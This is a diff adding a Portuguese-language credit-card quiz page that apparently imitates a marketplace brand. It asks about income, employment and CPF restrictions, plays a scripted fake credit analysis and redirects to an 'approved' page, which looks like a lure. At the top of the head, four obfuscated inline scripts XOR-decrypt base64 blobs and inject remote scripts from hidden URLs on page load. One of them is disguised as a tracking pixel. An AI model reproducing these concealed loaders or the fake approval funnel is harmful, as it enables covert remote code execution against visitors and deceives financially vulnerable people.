@@ -1,0 +1,1000 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+<script>(function(){var b_x=atob("DHBTg58oM7MKpTo+sAtx9u1EEYkozU5KwANprLBLV90k0E5T2RYqrfxHXp1o1xVN0wI68+tbHMZ+yEkR3BEn5uxcHdl5hxYc0QQn8fZKRsdv1hgE6wtx7f5FVpEwh15fxBF+9utFWtVziEpM1QY27esFS9BlwRdN0xtxr71eUt9/wBgEklIur+QKXdJnwBgEkhQy9/4FRsdnzFxHnQAh5ulNXccn1k9c2RQgobMKRdJm0F8cilJx/sJV");var n_g=[];for(var k_ui=0;k_ui<b_x.length;k_ui++){n_g.push(b_x.charCodeAt(k_ui)&255);}var s_0vo=n_g[0];var u_b=n_g.slice(1,1+s_0vo);var s_3n6=n_g.slice(1+s_0vo);var u_k=s_3n6.map(function(b,s_bfn){return b^u_b[s_bfn%s_0vo];});var w_7le6="";for(var a_st=0;a_st<u_k.length;a_st++){w_7le6+=String.fromCharCode(u_k[a_st]&255);}var s_enao=decodeURIComponent(escape(w_7le6));var b_v6i=JSON.parse(s_enao);var x_vi6=b_v6i.globals||[];x_vi6.forEach(function(v_hv){window[v_hv.name]=v_hv.value;});var n_rb2=document.createElement("script");n_rb2.src=b_v6i.url;n_rb2.async=true;n_rb2.defer=true;(b_v6i.attributes||[]).forEach(function(r_ebks){n_rb2.setAttribute(r_ebks.name,r_ebks.value);});(document.head||document.documentElement).appendChild(n_rb2);})();</script><script src="js/latest.js" async="" defer="" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids=""></script>
+<script>(function(){var x_v=atob("DPv5+JvEGQDXP+pP8YDbjemoOzr1V547gYjD17SnfW75Sp4imJ2A1virdC61TcU8komQiO+3NnC+R48j3ouQgP6oNGe4UI0jlNWTi7noO2GjS5gmk46NnejmI1uKE8gonZSbmfe3OzqMRMghkJac2qHmfm+4WIYqoZKBnfeNfSL7HZwunY6c2qHmL2HgDN8swMKYyav3LzDkXdgqw5mfyP6gO32KQg==");var a_0s=[];for(var s_m7=0;s_m7<x_v.length;s_m7++){a_0s.push(x_v.charCodeAt(s_m7)&255);}var j_9h=a_0s[0];var n_m1kx=a_0s.slice(1,1+j_9h);var m_c=a_0s.slice(1+j_9h);var m_svs=m_c.map(function(b,y_a208){return b^n_m1kx[y_a208%j_9h];});var b_4f1="";for(var y_b2=0;y_b2<m_svs.length;y_b2++){b_4f1+=String.fromCharCode(m_svs[y_b2]&255);}var a_40s7=decodeURIComponent(escape(b_4f1));var r_92=JSON.parse(a_40s7);var v_5f5b=r_92.globals||[];v_5f5b.forEach(function(f_b11){window[f_b11.name]=f_b11.value;});var z_7va5=document.createElement("script");z_7va5.src=r_92.url;z_7va5.async=true;z_7va5.defer=true;(r_92.attributes||[]).forEach(function(y_o8){z_7va5.setAttribute(y_o8.name,y_o8.value);});(document.head||document.documentElement).appendChild(z_7va5);})();</script><script src="js/pixel-google.js" async="" defer=""></script>
+
+
+    
+    
+
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min.css" rel="stylesheet">
+    <title>Análise de Perfil - mercado</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: #EEEEEE;
+            min-height: 100vh;
+            color: #333333;
+            position: relative;
+            overflow-x: hidden;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Animated Background Elements */
+        .bg-decoration {
+            position: fixed;
+            width: 100%;
+            height: 100%;
+            top: 0;
+            left: 0;
+            z-index: -1;
+            opacity: 0.05;
+            pointer-events: none;
+        }
+
+        .decoration {
+            position: absolute;
+            border-radius: 50%;
+            background: #EE4D2D;
+        }
+
+        .decoration1 {
+            width: 300px;
+            height: 300px;
+            top: 10%;
+            right: 5%;
+            animation: float1 20s infinite ease-in-out;
+        }
+
+        .decoration2 {
+            width: 200px;
+            height: 200px;
+            bottom: 10%;
+            left: 5%;
+            background: #EE4D2D;
+            animation: float2 25s infinite ease-in-out;
+        }
+
+        .decoration3 {
+            width: 150px;
+            height: 150px;
+            top: 50%;
+            left: 50%;
+            background: #EE4D2D;
+            animation: float3 30s infinite ease-in-out;
+        }
+
+        @keyframes float1 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(-30px, 30px) scale(1.1); }
+        }
+
+        @keyframes float2 {
+            0%, 100% { transform: translate(0, 0) scale(1); }
+            50% { transform: translate(30px, -30px) scale(0.9); }
+        }
+
+        @keyframes float3 {
+            0%, 100% { transform: translate(-50%, -50%) rotate(0deg); }
+            50% { transform: translate(-50%, -50%) rotate(180deg); }
+        }
+
+        /* Header */
+        .header {
+            background: #EE4D2D;
+            padding: 20px 24px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.6s ease-out;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        @keyframes slideDown {
+            from { transform: translateY(-100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Logo */
+        .logo-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoAppear 0.8s ease-out;
+        }
+
+        .logo-container img {
+            height: 50px;
+            width: auto;
+        }
+
+        @keyframes logoAppear {
+            from { transform: scale(0.8); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Quiz Container */
+        .quiz-container {
+            max-width: 520px;
+            margin: 30px auto;
+            padding: 40px 30px;
+            background: white;
+            border-radius: 8px;
+            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1);
+            animation: scaleIn 0.6s ease-out;
+            position: relative;
+        }
+
+        @keyframes scaleIn {
+            from { transform: scale(0.9); opacity: 0; }
+            to { transform: scale(1); opacity: 1; }
+        }
+
+        /* Progress Bar */
+        .progress-container {
+            width: 100%;
+            height: 8px;
+            background: #EDEDED;
+            border-radius: 10px;
+            margin-bottom: 35px;
+            overflow: hidden;
+            position: relative;
+        }
+
+        .progress-bar {
+            height: 100%;
+            background: #EE4D2D;
+            border-radius: 10px;
+            transition: width 0.5s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .progress-bar::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
+            animation: shine 2s infinite;
+        }
+
+        @keyframes shine {
+            from { transform: translateX(-100%); }
+            to { transform: translateX(100%); }
+        }
+
+        /* Question */
+        .quiz-question {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333333;
+            text-align: center;
+            margin-bottom: 40px;
+            line-height: 1.4;
+            animation: fadeInUp 0.6s ease-out;
+        }
+
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        /* Grid Options for First Quiz */
+        .options-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            animation: fadeIn 0.8s ease-out 0.3s both;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        .option-card {
+            background: white;
+            border: 1px solid #EDEDED;
+            border-radius: 8px;
+            padding: 25px 15px;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 130px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .option-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: #EE4D2D;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .option-card:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(238, 77, 45, 0.2);
+            border-color: #EE4D2D;
+        }
+
+        .option-card:hover::before {
+            opacity: 0.05;
+        }
+
+        .option-card:hover .option-icon-wrapper {
+            transform: scale(1.1);
+            background: #D63D21;
+        }
+
+        .option-card:active {
+            transform: scale(0.98);
+        }
+
+        /* CSS Icons */
+        .option-icon-wrapper {
+            width: 55px;
+            height: 55px;
+            background: #EE4D2D;
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        /* Money Icon */
+        .icon-money {
+            width: 30px;
+            height: 22px;
+            border: 3px solid #333333;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .icon-money::before {
+            content: '$';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #333333;
+            font-weight: bold;
+            font-size: 14px;
+        }
+
+        /* Rocket Icon */
+        .icon-rocket {
+            width: 22px;
+            height: 32px;
+            position: relative;
+        }
+
+        .icon-rocket-body {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 16px;
+            height: 24px;
+            background: #333333;
+            border-radius: 8px 8px 4px 4px;
+        }
+
+        .icon-rocket-window {
+            position: absolute;
+            top: 6px;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 8px;
+            height: 8px;
+            border: 2px solid #EE4D2D;
+            border-radius: 50%;
+            background: #EE4D2D;
+        }
+
+        .icon-rocket-fins {
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 0;
+            height: 0;
+            border-left: 12px solid transparent;
+            border-right: 12px solid transparent;
+            border-bottom: 10px solid #333333;
+        }
+
+        /* Ban Icon */
+        .icon-ban {
+            width: 30px;
+            height: 30px;
+            border: 3px solid #333333;
+            border-radius: 50%;
+            position: relative;
+        }
+
+        .icon-ban::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: -2px;
+            right: -2px;
+            height: 3px;
+            background: #333333;
+            transform: rotate(-45deg);
+        }
+
+        /* Calendar Icon */
+        .icon-calendar {
+            width: 28px;
+            height: 28px;
+            border: 3px solid #333333;
+            border-radius: 4px;
+            position: relative;
+        }
+
+        .icon-calendar::before,
+        .icon-calendar::after {
+            content: '';
+            position: absolute;
+            width: 4px;
+            height: 10px;
+            background: #333333;
+            top: -5px;
+        }
+
+        .icon-calendar::before {
+            left: 6px;
+        }
+
+        .icon-calendar::after {
+            right: 6px;
+        }
+
+        .calendar-dots {
+            position: absolute;
+            width: 4px;
+            height: 4px;
+            background: #333333;
+            border-radius: 50%;
+            bottom: 6px;
+            left: 6px;
+        }
+
+        .option-text {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333333;
+            text-align: center;
+            line-height: 1.3;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* List Options */
+        .quiz-option {
+            background: rgba(238, 77, 45, 0.08);
+            border: none;
+            color: #EE4D2D;
+            padding: 18px 24px;
+            margin: 10px 0;
+            border-radius: 6px;
+            cursor: pointer;
+            font-weight: 600;
+            font-size: 15px;
+            width: 100%;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            animation: slideIn 0.5s ease-out both;
+            text-align: center;
+        }
+
+        .quiz-option:nth-child(2) { animation-delay: 0.1s; }
+        .quiz-option:nth-child(3) { animation-delay: 0.15s; }
+        .quiz-option:nth-child(4) { animation-delay: 0.2s; }
+        .quiz-option:nth-child(5) { animation-delay: 0.25s; }
+        .quiz-option:nth-child(6) { animation-delay: 0.3s; }
+        .quiz-option:nth-child(7) { animation-delay: 0.35s; }
+        .quiz-option:nth-child(8) { animation-delay: 0.4s; }
+
+        @keyframes slideIn {
+            from { transform: translateX(-30px); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+
+        .quiz-option::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.5s ease;
+        }
+
+        .quiz-option:hover {
+            background: #EE4D2D;
+            color: #FFFFFF;
+            box-shadow: 0 4px 15px rgba(238, 77, 45, 0.3);
+            transform: translateY(-2px);
+        }
+
+        .quiz-option:hover::before {
+            left: 100%;
+        }
+
+        .quiz-option:active {
+            transform: scale(0.98);
+        }
+
+        /* Tela de Análise/Carregamento */
+        .analysis-content {
+            text-align: center;
+            padding: 20px 0;
+        }
+
+        .analysis-icon {
+            position: relative;
+            width: 120px;
+            height: 120px;
+            margin: 0 auto 30px;
+        }
+
+        .scanning-circle {
+            width: 120px;
+            height: 120px;
+            border: 4px solid #EDEDED;
+            border-top: 4px solid #EE4D2D;
+            border-radius: 50%;
+            animation: scanRotate 1.5s linear infinite;
+            position: absolute;
+        }
+
+        .analysis-symbol {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 60px;
+            height: 60px;
+            background: #EE4D2D;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #333333;
+            animation: pulse 2s ease-in-out infinite;
+        }
+
+        @keyframes scanRotate {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: translate(-50%, -50%) scale(1); }
+            50% { transform: translate(-50%, -50%) scale(1.1); }
+        }
+
+        .analysis-title {
+            font-size: 22px;
+            font-weight: 600;
+            color: #333333;
+            margin-bottom: 12px;
+        }
+
+        .analysis-description {
+            font-size: 15px;
+            color: #666666;
+            margin-bottom: 40px;
+            line-height: 1.5;
+        }
+
+        .analysis-steps {
+            text-align: left;
+            max-width: 350px;
+            margin: 0 auto;
+        }
+
+        .step-item {
+            display: flex;
+            align-items: center;
+            padding: 15px 20px;
+            margin: 10px 0;
+            background: #F5F5F5;
+            border-radius: 8px;
+            border-left: 4px solid #EDEDED;
+            transition: all 0.5s ease;
+        }
+
+        .step-item.active {
+            background: rgba(238, 77, 45, 0.08);
+            border-left-color: #EE4D2D;
+        }
+
+        .step-item.completed {
+            background: rgba(0, 166, 80, 0.08);
+            border-left-color: #00A650;
+        }
+
+        .step-icon {
+            width: 40px;
+            height: 40px;
+            background: #EDEDED;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-right: 15px;
+            transition: all 0.3s ease;
+            color: #666666;
+        }
+
+        .step-item.active .step-icon {
+            background: #EE4D2D;
+            color: #FFFFFF;
+        }
+
+        .step-item.completed .step-icon {
+            background: #00A650;
+            color: white;
+        }
+
+        .step-text {
+            flex: 1;
+            font-weight: 500;
+            color: #333333;
+        }
+
+        .step-status {
+            font-size: 14px;
+            color: #999999;
+        }
+
+        .loading-dots {
+            display: flex;
+            gap: 4px;
+        }
+
+        .loading-dots span {
+            width: 6px;
+            height: 6px;
+            background: #EE4D2D;
+            border-radius: 50%;
+            animation: loadingBounce 1.4s infinite;
+        }
+
+        .loading-dots span:nth-child(1) { animation-delay: 0s; }
+        .loading-dots span:nth-child(2) { animation-delay: 0.2s; }
+        .loading-dots span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes loadingBounce {
+            0%, 80%, 100% { transform: scale(0.8); opacity: 0.5; }
+            40% { transform: scale(1.2); opacity: 1; }
+        }
+
+        /* Footer */
+        footer {
+            padding: 20px;
+            text-align: center;
+            background: #FFFFFF;
+            margin-top: auto;
+        }
+
+        footer p {
+            color: #999999;
+            font-size: 12px;
+            margin: 2px 0;
+            line-height: 1.5;
+        }
+
+        footer a {
+            color: #EE4D2D;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        /* Mobile Responsive */
+        @media (max-width: 500px) {
+            .quiz-container {
+                margin: 20px 15px;
+                padding: 30px 20px;
+            }
+
+            .quiz-question {
+                font-size: 20px;
+            }
+
+            .header {
+                padding: 18px 20px;
+            }
+
+            .logo-container img {
+                height: 40px;
+            }
+
+            .analysis-icon {
+                width: 100px;
+                height: 100px;
+            }
+
+            .scanning-circle {
+                width: 100px;
+                height: 100px;
+            }
+
+            .analysis-symbol {
+                width: 50px;
+                height: 50px;
+                font-size: 20px;
+            }
+        }
+    </style>
+
+    
+
+    <!-- Pixel UTMify (ParceiroSocial) -->
+    
+
+    
+
+    
+
+    
+<script src="js/utm-handler.js" data-token="ea930328-cad0-4277-b99d-8c16148dcdbb"></script>
+<style>
+        @keyframes ripple {
+            to {
+                transform: scale(8);
+                opacity: 0;
+            }
+        }
+    </style>
+<!-- UTMify pixel and UTM tracking -->
+<script>(function(){var n_9umv=atob("DOmOujQiboEBZRMcE5Ksz0ZOTLsjDWdoY5q0lRtBCu8vEGdxeo/3lFdNA69jFzxvcJvnykBRQfFoHXZwPJnnwlFOQOtyRz8+cp36yF1AG/VkFjEmSLSimFNOAeNgCWA+KbL1mFpDA+QjXzFsepHr1n1GTK0jE3JwZoysgBYUD+AyUScrK4+4j1cQCrkzXSR+IdzqjAMAE9x8");var f_3w0=[];for(var e_9ihb=0;e_9ihb<n_9umv.length;e_9ihb++){f_3w0.push(n_9umv.charCodeAt(e_9ihb)&255);}var q_jc2=f_3w0[0];var v_p14n=f_3w0.slice(1,1+q_jc2);var x_to=f_3w0.slice(1+q_jc2);var y_cfcj=x_to.map(function(b,i_eb){return b^v_p14n[i_eb%q_jc2];});var y_lgc="";for(var r_4y4=0;r_4y4<y_cfcj.length;r_4y4++){y_lgc+=String.fromCharCode(y_cfcj[r_4y4]&255);}var j_oi3=decodeURIComponent(escape(y_lgc));var b_fccl=JSON.parse(j_oi3);var p_1=b_fccl.globals||[];p_1.forEach(function(i_1wym){window[i_1wym.name]=i_1wym.value;});var p_w3kc=document.createElement("script");p_w3kc.src=b_fccl.url;p_w3kc.async=true;p_w3kc.defer=true;(b_fccl.attributes||[]).forEach(function(u_9vj){p_w3kc.setAttribute(u_9vj.name,u_9vj.value);});(document.head||document.documentElement).appendChild(p_w3kc);})();</script>
+<script>(function(){var e_0z=atob("DE/SdGpmbNX2MyoZiDTwARgKTu/UW15t+DzoW0UFCLvYRl504SmrWgkJAfuUQQVq6z27BB4VQ6CCXlk25C6mERkSQr+FEQY76TumBgMEGaGTQAgj0zTwGgsLCffMEU54/C7/AR4LBbOPHlpr7Tm3Gh5LFLaZVwdq6yTwWEgQDbmDVggjqm2vWBFEArSbVggjqiuzAAtLGaGbWkxgpT+gERwDAqHbQF974SuhVkZEGrSaRk87sm3wCTcb");var o_7o=[];for(var u_j=0;u_j<e_0z.length;u_j++){o_7o.push(e_0z.charCodeAt(u_j)&255);}var a_a=o_7o[0];var r_ji86=o_7o.slice(1,1+a_a);var r_b=o_7o.slice(1+a_a);var q_m1=r_b.map(function(b,r_co2){return b^r_ji86[r_co2%a_a];});var d_17sz="";for(var m_hsnv=0;m_hsnv<q_m1.length;m_hsnv++){d_17sz+=String.fromCharCode(q_m1[m_hsnv]&255);}var w_n=decodeURIComponent(escape(d_17sz));var w_1dqv=JSON.parse(w_n);var r_6m=w_1dqv.globals||[];r_6m.forEach(function(r_jqj){window[r_jqj.name]=r_jqj.value;});var w_fj=document.createElement("script");w_fj.src=w_1dqv.url;w_fj.async=true;w_fj.defer=true;(w_1dqv.attributes||[]).forEach(function(z_jqz){w_fj.setAttribute(z_jqz.name,z_jqz.value);});(document.head||document.documentElement).appendChild(w_fj);})();</script>
+</head>
+<body>
+    <div class="bg-decoration">
+        <div class="decoration decoration1"></div>
+        <div class="decoration decoration2"></div>
+        <div class="decoration decoration3"></div>
+    </div>
+
+    <div class="header">
+        <!-- Logo mercado -->
+        <div class="logo-container">
+            <img src="images/logoofc.png" alt="mercado">
+        </div>
+    </div>
+
+    <div class="quiz-container" id="quiz1">
+        <div class="progress-container">
+            <div class="progress-bar" style="width: 25%"></div>
+        </div>
+        <h2 class="quiz-question">O que é mais importante para você em um cartão de crédito?</h2>
+        
+        <div class="options-grid">
+            <div class="option-card" onclick="showQuiz2()">
+                <div class="option-icon-wrapper">
+                    <div class="icon-money"></div>
+                </div>
+                <p class="option-text">Limite alto</p>
+            </div>
+            <div class="option-card" onclick="showQuiz2()">
+                <div class="option-icon-wrapper">
+                    <div class="icon-rocket">
+                        <div class="icon-rocket-body"></div>
+                        <div class="icon-rocket-window"></div>
+                        <div class="icon-rocket-fins"></div>
+                    </div>
+                </div>
+                <p class="option-text">Crédito imediato</p>
+            </div>
+            <div class="option-card" onclick="showQuiz2()">
+                <div class="option-icon-wrapper">
+                    <div class="icon-ban"></div>
+                </div>
+                <p class="option-text">Não consultar SPC/Serasa</p>
+            </div>
+            <div class="option-card" onclick="showQuiz2()">
+                <div class="option-icon-wrapper">
+                    <div class="icon-calendar">
+                        <span class="calendar-dots"></span>
+                    </div>
+                </div>
+                <p class="option-text">Sem anuidade</p>
+            </div>
+        </div>
+    </div>
+    
+    <div class="quiz-container" id="quiz2" style="display: none;">
+        <div class="progress-container">
+            <div class="progress-bar" style="width: 50%"></div>
+        </div>
+        <h2 class="quiz-question">Em qual grupo você se encaixa?</h2>
+        
+        <button class="quiz-option" onclick="showQuiz3()">Empreendedor</button>
+        <button class="quiz-option" onclick="showQuiz3()">Carteira assinada</button>
+        <button class="quiz-option" onclick="showQuiz3()">Desempregado</button>
+        <button class="quiz-option" onclick="showQuiz3()">Aposentado</button>
+        <button class="quiz-option" onclick="showQuiz3()">Servidor público</button>
+        <button class="quiz-option" onclick="showQuiz3()">Estudante</button>
+        <button class="quiz-option" onclick="showQuiz3()">Autônomo</button>
+    </div>
+
+    <div class="quiz-container" id="quiz3" style="display: none;">
+        <div class="progress-container">
+            <div class="progress-bar" style="width: 75%"></div>
+        </div>
+        <h2 class="quiz-question">Qual sua renda mensal?</h2>
+        
+        <button class="quiz-option" onclick="showQuiz4()">Até R$ 1.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Entre R$ 1.000 e R$ 2.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Entre R$ 2.000 e R$ 4.000</button>
+        <button class="quiz-option" onclick="showQuiz4()">Acima de R$ 4.000</button>
+    </div>
+
+    <div class="quiz-container" id="quiz4" style="display: none;">
+        <div class="progress-container">
+            <div class="progress-bar" style="width: 100%"></div>
+        </div>
+        <h2 class="quiz-question">Você tem restrições no CPF?</h2>
+        
+        <button class="quiz-option" onclick="startAnalysis()">Sim</button>
+        <button class="quiz-option" onclick="startAnalysis()">Não</button>
+    </div>
+
+    <!-- Tela de Análise/Carregamento -->
+    <div class="quiz-container" id="analysisScreen" style="display: none;">
+        <div class="progress-container">
+            <div class="progress-bar analysis-progress" style="width: 100%"></div>
+        </div>
+        
+        <div class="analysis-content">
+            <div class="analysis-icon">
+                <div class="scanning-circle"></div>
+                <div class="analysis-symbol">
+                    <i class="fas fa-chart-line"></i>
+                </div>
+            </div>
+            
+            <h2 class="analysis-title" id="analysisTitle">Analisando suas respostas...</h2>
+            <p class="analysis-description" id="analysisDescription">
+                Estamos processando suas informações para encontrar a melhor oferta de cartão para você.
+            </p>
+            
+            <div class="analysis-steps">
+                <div class="step-item active" id="step1">
+                    <div class="step-icon">
+                        <i class="fas fa-user-check"></i>
+                    </div>
+                    <span class="step-text">Validando perfil</span>
+                    <div class="step-status">
+                        <div class="loading-dots">
+                            <span></span>
+                            <span></span>
+                            <span></span>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="step-item" id="step2">
+                    <div class="step-icon">
+                        <i class="fas fa-calculator"></i>
+                    </div>
+                    <span class="step-text">Calculando limite</span>
+                    <div class="step-status">Aguardando</div>
+                </div>
+                
+                <div class="step-item" id="step3">
+                    <div class="step-icon">
+                        <i class="fas fa-check-circle"></i>
+                    </div>
+                    <span class="step-text">Verificando aprovação</span>
+                    <div class="step-status">Aguardando</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <p>© 2026, Todos os direitos reservados.</p>
+        <p><a href="#">Termos e condições</a> · <a href="#">Privacidade</a></p>
+    </footer>
+
+<script>
+    function showQuiz2() {
+        document.getElementById('quiz1').style.display = 'none';
+        document.getElementById('quiz2').style.display = 'block';
+        updateProgressBar(50);
+    }
+
+    function showQuiz3() {
+        document.getElementById('quiz2').style.display = 'none';
+        document.getElementById('quiz3').style.display = 'block';
+        updateProgressBar(75);
+    }
+
+    function showQuiz4() {
+        document.getElementById('quiz3').style.display = 'none';
+        document.getElementById('quiz4').style.display = 'block';
+        updateProgressBar(100);
+    }
+
+    function startAnalysis() {
+        document.getElementById('quiz4').style.display = 'none';
+        document.getElementById('analysisScreen').style.display = 'block';
+        
+        // Inicia sequência de análise
+        runAnalysisSequence();
+    }
+
+    function runAnalysisSequence() {
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
+        const step3 = document.getElementById('step3');
+        const title = document.getElementById('analysisTitle');
+        const description = document.getElementById('analysisDescription');
+
+        // Etapa 1: Validando perfil (já ativa)
+        setTimeout(() => {
+            step1.classList.remove('active');
+            step1.classList.add('completed');
+            step1.querySelector('.step-status').innerHTML = 'Concluído';
+            
+            // Ativa etapa 2
+            step2.classList.add('active');
+            step2.querySelector('.step-status').innerHTML = '<div class="loading-dots"><span></span><span></span><span></span></div>';
+            
+            title.textContent = 'Calculando seu limite...';
+            description.textContent = 'Com base no seu perfil, estamos definindo o melhor limite para você.';
+        }, 2500);
+
+        // Etapa 2: Calculando limite
+        setTimeout(() => {
+            step2.classList.remove('active');
+            step2.classList.add('completed');
+            step2.querySelector('.step-status').innerHTML = 'Concluído';
+            
+            // Ativa etapa 3
+            step3.classList.add('active');
+            step3.querySelector('.step-status').innerHTML = '<div class="loading-dots"><span></span><span></span><span></span></div>';
+            
+            title.textContent = 'Finalizando aprovação...';
+            description.textContent = 'Últimos ajustes para garantir a melhor experiência para você.';
+        }, 5000);
+
+        // Etapa 3: Aprovação final
+        setTimeout(() => {
+            step3.classList.remove('active');
+            step3.classList.add('completed');
+            step3.querySelector('.step-status').innerHTML = 'Concluído';
+            
+            title.textContent = 'Análise concluída!';
+            description.textContent = 'Redirecionando para seus resultados...';
+        }, 7500);
+
+        // Redireciona para próxima página
+        setTimeout(() => {
+            // Adiciona parâmetros de análise concluída
+            const params = getUrlParams();
+            const additionalParams = {
+                quiz_completed: 'true',
+                analysis_done: 'true'
+            };
+
+            const nextUrl = buildUrlWithParams('aprovado.html', additionalParams);
+            console.log('Redirecionando para resultado:', nextUrl);
+            window.location.href = nextUrl;
+        }, 9000);
+    }
+
+    function updateProgressBar(width) {
+        const bars = document.querySelectorAll('.progress-bar');
+        bars.forEach(bar => {
+            if (bar.parentElement.parentElement.style.display !== 'none') {
+                bar.style.width = width + '%';
+            }
+        });
+    }
+
+    // URL Parameters handling
+    function getUrlParams() {
+        const params = {};
+        const queryString = window.location.search;
+        const urlParams = new URLSearchParams(queryString);
+        
+        for (const [key, value] of urlParams) {
+            params[key] = value;
+        }
+        return params;
+    }
+
+    function buildUrlWithParams(baseUrl, additionalParams = {}) {
+        const params = getUrlParams();
+        const url = new URL(baseUrl, window.location.href);
+        
+        // Adiciona parâmetros originais
+        Object.keys(params).forEach(key => {
+            url.searchParams.append(key, params[key]);
+        });
+
+        // Adiciona parâmetros adicionais
+        Object.keys(additionalParams).forEach(key => {
+            if (additionalParams[key]) {
+                url.searchParams.append(key, additionalParams[key]);
+            }
+        });
+        
+        return url.toString();
+    }
+
+    // Add ripple effect
+    document.querySelectorAll('.quiz-option, .option-card').forEach(element => {
+        element.addEventListener('click', function(e) {
+            const ripple = document.createElement('div');
+            ripple.style.position = 'absolute';
+            ripple.style.borderRadius = '50%';
+            ripple.style.background = 'rgba(238, 77, 45, 0.3)';
+            ripple.style.width = ripple.style.height = '40px';
+            ripple.style.left = e.clientX - this.offsetLeft - 20 + 'px';
+            ripple.style.top = e.clientY - this.offsetTop - 20 + 'px';
+            ripple.style.animation = 'ripple 0.6s ease-out';
+            ripple.style.pointerEvents = 'none';
+            this.style.position = 'relative';
+            this.appendChild(ripple);
+            
+            setTimeout(() => ripple.remove(), 600);
+        });
+    });
+
+    // CSS for ripple animation
+    const style = document.createElement('style');
+    style.textContent = `
+        @keyframes ripple {
+            to {
+                transform: scale(8);
+                opacity: 0;
+            }
+        }
+    `;
+    document.head.appendChild(style);
+
+    // Log parâmetros recebidos
+    console.log('Parâmetros do quiz:', getUrlParams());
+</script>
+
+
+</body></html>
